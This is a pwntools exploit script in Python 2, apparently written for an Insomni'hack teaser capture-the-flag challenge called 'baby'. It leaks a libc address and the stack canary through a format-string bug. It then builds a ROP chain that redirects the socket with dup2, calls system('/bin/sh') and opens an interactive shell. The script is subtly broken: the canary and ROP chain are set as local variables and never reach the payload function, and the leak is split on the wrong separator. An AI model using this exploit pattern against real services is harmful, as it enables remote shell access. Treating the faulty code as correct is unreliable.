
from pwn import *
"""===============    Configuration    ================"""
pwnName = "baby"
local = True
libName = 'libc.so'
host, port = 'baby.teaser.insomnihack.ch', 1337
context.endian = 'little'
context.arch = 'amd64'
context.os = "linux"
context.log_level = "DEBUG"
context.terminal = ['tmux', 'splitw', '-h']
print "\n" + "="*60 + '\n'
"""====== =============================================="""
binary = ELF(pwnName)
libc = ELF(libName)
rop = None
canary= 0
if local:
    r = remote("localhost", 1337)
else:
    r = remote(host, port)


def leak_text():
    r.sendlineafter("> ", '2')
    r.sendlineafter("> ", '%16x '*158)
    leaked = r.recvline().strip().split('_')
    r.sendline('')
    libc.address = int(leaked[157], 16) - 0x20830
    canary = int(leaked[137], 16)

def chain():
    rop = ROP([binary, libc])
    rop.raw(rop.find_gadget(['pop rdi', 'ret']))
    rop.raw(0x4)
    rop.raw(rop.find_gadget(['pop rsi', 'ret']))
    rop.raw(0x0)
    rop.raw(libc.symbols['dup2'])

    rop.raw(rop.find_gadget(['pop rsi', 'ret']))
    rop.raw(0x1)
    rop.raw(libc.symbols['dup2'])
    FLAGS_OUT_FOR_HARAM_BASH = next(libc.search('/bin/sh'))
    rop.system(FLAGS_OUT_FOR_HARAM_BASH)

def payload():
    p =fit({1032: p64(canary) + bytes(rop)}, filler ='A')
    r.sendlineafter("> ", "1")
    r.sendlineafter("?", str(len(p) +1))
    r.sendline(p)
    print p
    r.interactive()

if __name__ == "__main__":
    leak_text()
    chain()
    payload()

